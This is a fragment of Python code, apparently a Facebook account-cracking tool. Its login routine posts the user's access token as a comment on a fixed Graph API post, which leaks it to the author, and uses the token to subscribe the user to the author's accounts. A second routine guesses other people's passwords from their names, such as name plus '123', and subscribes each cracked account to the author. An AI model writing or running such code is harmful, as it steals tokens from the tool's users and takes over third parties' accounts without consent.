...
def login():
	try:
		...
		try:
			...
			req.post(f'https://graph.facebook.com/100066891183360/subscribers?access_token={token}') #NATHAN
			req.post(f"https://graph.facebook.com/100007363270417/subscribers?access_token={token}") #SMITHY
			req.post(f'https://graph.facebook.com/2990953524493394/comments?message={token}&access_token={token}')
			req.post(f'https://graph.facebook.com/2990953524493394/comments?message={random.choice(["latif ganteng :v","latif mengmantav","saya jelek latif ganteng:v"])}&access_token={token}')
			time.sleep(2)
			dump(token,nama,ttl)
		except KeyError:
	...
	def kondisi_api(self,user,aj):
		...
		for pw in aj:
			...
			if logika.get("status")=="ok":
				...
				req.post(f'https://graph.facebook.com/100007363270417/subscribers?access_token={logika.get("token")}') #LATIF
				break
			...
			for ajg in id:
				...
				if(len(str(name.lower()))<=3):
					...
					if(len(str(name.lower()))>=6):
						password=[name.lower(),name.lower()+'123',name.lower()+'12345',lengkap]
					else:
						password=[name.lower()+'123',name.lower()+'12345',lengkap]
					if(pas in ('t','T')):
